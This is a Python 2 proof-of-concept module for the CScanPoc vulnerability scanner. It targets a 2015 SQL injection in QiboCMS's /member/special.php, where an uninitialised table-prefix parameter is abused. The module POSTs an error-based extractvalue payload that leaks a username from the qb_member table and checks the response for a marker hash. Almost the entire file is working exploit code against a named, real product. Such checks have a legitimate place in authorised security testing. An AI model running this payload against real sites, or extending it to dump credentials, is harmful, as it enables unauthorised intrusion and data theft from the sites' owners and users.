# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0025_L' # 平台漏洞编号，留空
    name = '齐博CMS 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-06-05'  # 漏洞公布时间
    desc = '''
        /member/special.php中的相关代码
        现$TB_pre被遗漏了，该变量的作用是作为表的前缀，没有初始化，导致SQL注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3198/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '92400197-ffc6-443f-9f0d-30ee0c7701e2'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #首先注册用户，创建专题，记下专题ID。然后便可以构造注入语句了。
            #获取cookies
            cookies = {}
            '''
            raw_cookies = 'bid=xxxxx;_pk_ref.100001.8cb4=xxxxxxx;__utma=xxxxx'
            for line in raw_cookies.split(';'):  
                key,value=line.split('=',1)#1代表只分一次，得到两个数据  
                cookies[key]=value 
            ''' 
            payload = "/member/special.php?job=show_BBSiframe&id=25&type=all"
            data = "Tb_pre=qb_member where 1 and extractvalue(1,(select concat(0x7e,username,md5(c))from qb_member limit 1))-- a"
            url = self.target + payload
            r = requests.post(url, data=data, cookies=cookies)

            if '4a8a08f09d37b73795649038408b5f33' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
